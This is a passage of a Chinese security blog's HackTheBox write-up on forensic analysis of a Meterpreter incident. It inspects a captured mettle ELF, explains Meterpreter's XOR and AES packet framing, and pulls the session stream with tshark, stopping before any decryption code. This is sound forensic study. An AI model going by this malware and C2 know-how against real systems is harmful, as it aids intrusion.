<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="简述这两个部分是insane难度的HTB Response机器的root部分，其中msf meterpreter流量解密是此box的特色，和最难的部分，为了blog美观。所以顺带把破碎ssh key 复原的部分也加进来了，主要参考HTB response writeup from 0xdf’s blog记录这篇博客加深记忆和理解，及供后续时间充足在做深入研究查阅，备忘。">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox Response [Msf Meterpreter 流量解密] + [破碎ssh key 复原]">
<meta property="og:url" content="https://fdlucifer.github.io/2023/02/07/msf-meterpreter-traffic-decrypt/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="简述这两个部分是insane难度的HTB Response机器的root部分，其中msf meterpreter流量解密是此box的特色，和最难的部分，为了blog美观。所以顺带把破碎ssh key 复原的部分也加进来了，主要参考HTB response writeup from 0xdf’s blog记录这篇博客加深记忆和理解，及供后续时间充足在做深入研究查阅，备忘。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response2.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response3.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response4.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response5.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response6.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response7.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response8.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response9.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response10.png">
<meta property="article:published_time" content="2023-02-07T05:28:19.000Z">
<meta property="article:modified_time" content="2023-02-11T17:06:20.951Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="reversing">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response.png">


<link rel="canonical" href="https://fdlucifer.github.io/2023/02/07/msf-meterpreter-traffic-decrypt/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2023/02/07/msf-meterpreter-traffic-decrypt/","path":"2023/02/07/msf-meterpreter-traffic-decrypt/","title":"HackTheBox Response [Msf Meterpreter 流量解密] + [破碎ssh key 复原]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>HackTheBox Response [Msf Meterpreter 流量解密] + [破碎ssh key 复原] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">42</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">206</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">简述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Msf-Meterpreter-%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86"><span class="nav-number">2.</span> <span class="nav-text">Msf Meterpreter 流量解密</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#incident-2020-3-042"><span class="nav-number">2.1.</span> <span class="nav-text">incident_2020-3-042</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dump-pcap"><span class="nav-number">2.2.</span> <span class="nav-text">dump.pcap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Binary%E5%88%86%E6%9E%90"><span class="nav-number">2.3.</span> <span class="nav-text">Binary分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Meterpreter-%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84"><span class="nav-number">2.4.</span> <span class="nav-text">Meterpreter 数据包结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Video"><span class="nav-number">2.5.</span> <span class="nav-text">Video</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E5%A4%96%E5%B1%82%E6%95%B0%E6%8D%AE%E6%B5%81"><span class="nav-number">2.6.</span> <span class="nav-text">解析外层数据流</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E6%9C%AA%E5%8A%A0%E5%AF%86%E7%9A%84TLVs%E6%95%B0%E6%8D%AE%E6%B5%81"><span class="nav-number">2.7.</span> <span class="nav-text">解析未加密的TLVs数据流</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E5%8F%96AES%E5%AF%86%E9%92%A5"><span class="nav-number">2.8.</span> <span class="nav-text">提取AES密钥</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E5%8A%A0%E5%AF%86%E7%9A%84TLVs%E6%95%B0%E6%8D%AE%E6%B5%81"><span class="nav-number">2.9.</span> <span class="nav-text">解析加密的TLVs数据流</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Meterpreter-Session-%E5%88%86%E6%9E%90"><span class="nav-number">2.10.</span> <span class="nav-text">Meterpreter Session 分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Extract-Zip"><span class="nav-number">2.11.</span> <span class="nav-text">Extract Zip</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A0%B4%E7%A2%8Essh-key-%E5%A4%8D%E5%8E%9F"><span class="nav-number">3.</span> <span class="nav-text">破碎ssh key 复原</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5-docs-backup-zip"><span class="nav-number">3.1.</span> <span class="nav-text">检查 docs_backup.zip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RSA%E8%83%8C%E6%99%AF"><span class="nav-number">3.2.</span> <span class="nav-text">RSA背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Recover-Key"><span class="nav-number">3.3.</span> <span class="nav-text">Recover Key</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference-Sources"><span class="nav-number">4.</span> <span class="nav-text">Reference Sources</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">206</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2023/02/07/msf-meterpreter-traffic-decrypt/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="HackTheBox Response [Msf Meterpreter 流量解密] + [破碎ssh key 复原] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HackTheBox Response [Msf Meterpreter 流量解密] + [破碎ssh key 复原]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2023-02-07 13:28:19" itemprop="dateCreated datePublished" datetime="2023-02-07T13:28:19+08:00">2023-02-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2023-02-12 01:06:20" itemprop="dateModified" datetime="2023-02-12T01:06:20+08:00">2023-02-12</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E9%80%86%E5%90%91/%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/" itemprop="url" rel="index"><span itemprop="name">流量解密</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E9%80%86%E5%90%91/%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/ssh-key-recover/" itemprop="url" rel="index"><span itemprop="name">ssh key recover</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>10k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>37 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>这两个部分是insane难度的HTB Response机器的root部分，其中msf meterpreter流量解密是此box的特色，和最难的部分，为了blog美观。所以顺带把破碎ssh key 复原的部分也加进来了，主要参考<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIzLzAyLzA0L2h0Yi1yZXNwb25zZS5odG1s">HTB response writeup from 0xdf’s blog<i class="fa fa-external-link-alt"></i></span>记录这篇博客加深记忆和理解，及供后续时间充足在做深入研究查阅，备忘。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response.png"></li>
</ul>
<span id="more"></span>

<h1 id="Msf-Meterpreter-流量解密"><a href="#Msf-Meterpreter-流量解密" class="headerlink" title="Msf Meterpreter 流量解密"></a>Msf Meterpreter 流量解密</h1><h2 id="incident-2020-3-042"><a href="#incident-2020-3-042" class="headerlink" title="incident_2020-3-042"></a>incident_2020-3-042</h2><p>通过之前的渗透以scryh用户登录ssh之后，现在可以访问incident_2020-3-042文件夹。它有三个文件:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scryh@response:~/incident_2022-3-042$ file *</span><br><span class="line">core.auto_update: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from <span class="string">&#x27;./auto_update&#x27;</span>, real uid: 0, effective uid: 0, real gid: 0, effective gid: 0, execfn: <span class="string">&#x27;./auto_update&#x27;</span>, platform: <span class="string">&#x27;x86_64&#x27;</span></span><br><span class="line">dump.pcap:        pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 262144)</span><br><span class="line">IR_report.pdf:    PDF document, version 1.4</span><br></pre></td></tr></table></figure>

<p>一个core dump，一个PCAP和一个PDF。用scp抓取这三个文件到本地</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -i scryh_id_rsa scryh@response.htb:~/incident_2022-3-042/* .</span><br></pre></td></tr></table></figure>

<p>IR_report.pdf 是一个事件的单页摘要:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response1.png"></li>
</ul>
<p>看起来像是有人访问了聊天应用程序，让管理员下载了一个链接并执行meterpreter payload，导出了一个zip存档。core dump中有恶意软件被kill之前的内存，而PCAP包中有记录网络流量。</p>
<h2 id="dump-pcap"><a href="#dump-pcap" class="headerlink" title="dump.pcap"></a>dump.pcap</h2><p>通过分析pcap流量包，发现在(TCP stream 96) 一个ELF文件auto_update从攻击者方被下载:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response2.png"></li>
</ul>
<p>下一个流量(97)是返回到攻击者4444上的连接，该连接是加密的。</p>
<h2 id="Binary分析"><a href="#Binary分析" class="headerlink" title="Binary分析"></a>Binary分析</h2><p>通过”导出对象” &gt; “HTTP…”从Wireshark下载一份ELF的副本:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response3.png"></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/response]</span><br><span class="line">└─<span class="comment"># file auto_update    </span></span><br><span class="line">auto_update: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), static-pie linked, with debug_info, not stripped</span><br><span class="line">                                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/response]</span><br><span class="line">└─<span class="comment"># strings -n 10 auto_update</span></span><br><span class="line">...snip...</span><br><span class="line">  -u, --uri &lt;uri&gt;        add connection URI</span><br><span class="line">  -U, --uuid &lt;uuid&gt;      <span class="built_in">set</span> the UUID (<span class="built_in">base64</span>)</span><br><span class="line">  -d, --debug &lt;level&gt;    <span class="built_in">enable</span> debug output (<span class="built_in">set</span> to 0 to <span class="built_in">disable</span>)</span><br><span class="line">  -o, --out &lt;file&gt;       write debug output to a file</span><br><span class="line">  -b, --background &lt;0|1&gt; start as a background service (0 <span class="built_in">disable</span>, 1 <span class="built_in">enable</span>)</span><br><span class="line">  -p, --persist [none|install|uninstall] manage persistence</span><br><span class="line">  -m, --modules &lt;path&gt;   add modules from path</span><br><span class="line">  -n, --name &lt;name&gt;      name to start as</span><br><span class="line">  -l, --listen</span><br><span class="line">  -c, --console</span><br><span class="line">hu:U:G:d:o:b:p:n:lcm:</span><br><span class="line">using name: %s</span><br><span class="line">/mettle/mettle/src/main.c</span><br><span class="line">session-guid</span><br><span class="line">background</span><br><span class="line">default_opts</span><br><span class="line">could not initialize</span><br><span class="line">/mettle/mettle/src/mettle.c</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/://</span><br><span class="line">?application/octet-stream</span><br><span class="line">Connection: close</span><br><span class="line">/mettle/mettle/src/c2_http.c</span><br><span class="line">referer: %s</span><br><span class="line">cookie: %s</span><br><span class="line">header: %s</span><br><span class="line">?channel-req-%d</span><br><span class="line">could not find handlers <span class="keyword">for</span> channel <span class="built_in">type</span> %s</span><br><span class="line">/mettle/mettle/src/channel.c</span><br><span class="line">No extension received</span><br><span class="line">/mettle/mettle/src/coreapi.c</span><br><span class="line">No extension name specified</span><br><span class="line">Loading extension <span class="string">&#x27;%s&#x27;</span> from binary image</span><br><span class="line">Failed to allocate memory <span class="keyword">for</span> <span class="string">&#x27;%s&#x27;</span> binary image</span><br><span class="line">...snip...</span><br></pre></td></tr></table></figure>

<p>帮助菜单很有趣，但出现了几次的术语”mettle”也很有趣。<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXR0bGU=">Mettle<i class="fa fa-external-link-alt"></i></span>是Meterpreter的一部分，具体来说:</p>
<p><em><strong>这是native-code Meterpreter的实现，设计用于可移植性、可嵌入性和低资源利用率。它可以运行在最小的嵌入式Linux上，目标是大铁，目标是Android、iOS、macOS、Linux和Windows，但可以移植到几乎任何posix兼容的环境。</strong></em></p>
<p>在<span class="exturl" data-url="aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvYWZmOTQ3Y2VhNzJhYjYyOTY0MTYwODAwNDE3NTNhZjc5ZmEwNjg0ZTM2MjEyODFmNTM3Y2U1ZjA0NmRiMzlkMw==">VirusTotal<i class="fa fa-external-link-alt"></i></span>中搜索哈希显示这个ELF已经上传，签名显示它是Meterpreter:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response4.png"></li>
</ul>
<h2 id="Meterpreter-数据包结构"><a href="#Meterpreter-数据包结构" class="headerlink" title="Meterpreter 数据包结构"></a>Meterpreter 数据包结构</h2><p>找到一些关于meterpreter在wire上使用的协议的资料。它是一种<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVHlwZSVFMiU4MCU5M2xlbmd0aCVFMiU4MCU5M3ZhbHVl">type-length-value协议<i class="fa fa-external-link-alt"></i></span>(实际上更像LTV)，有一个header，数据包是加密的，还有一个IV。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yay9wdWxsLzg2MjU=">This pull request<i class="fa fa-external-link-alt"></i></span>讨论了2017年协议的变化，并对”新”(当前)版本进行了一些不错的描述。</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cucnVieWRvYy5pbmZvL2dpdGh1Yi9yYXBpZDcvbWV0YXNwbG9pdC1mcmFtZXdvcmsvUmV4L1Bvc3QvTWV0ZXJwcmV0ZXIvUGFja2V0">This documentation from Rapid7<i class="fa fa-external-link-alt"></i></span>的文档显示了数据包对象及其字段。</li>
</ul>
<p>每个数据包以一个应用于数据包其余部分的四字节XOR键开始。header的其余部分是session GUID，加密标志，数据包长度和数据包类型:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response5.png"></li>
</ul>
<p>数据包长度是指从起始点到结束点的长度。</p>
<p>如果报文没有加密，则启动TLV报文。如果它是加密的，剩下的包有一个16字节的AES IV，一旦解密，结果就是TLV包。</p>
<h2 id="Video"><a href="#Video" class="headerlink" title="Video"></a>Video</h2><p>推荐观看0xdf的youtube视频<span class="exturl" data-url="aHR0cHM6Ly95b3V0dS5iZS8tUmxaQ1RZY2d2aw==">Decrypting Meterpreter Traffic in PCAP (with coredump)<i class="fa fa-external-link-alt"></i></span>，解密python脚本写的很丝滑</p>
<h2 id="解析外层数据流"><a href="#解析外层数据流" class="headerlink" title="解析外层数据流"></a>解析外层数据流</h2><p>使用tshark将meterpreter TCP流量拉到文件msf.pcap中:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -q -r dump.pcap -Y tcp.stream==97 -w msf.pcap</span><br></pre></td></tr></table></figure>

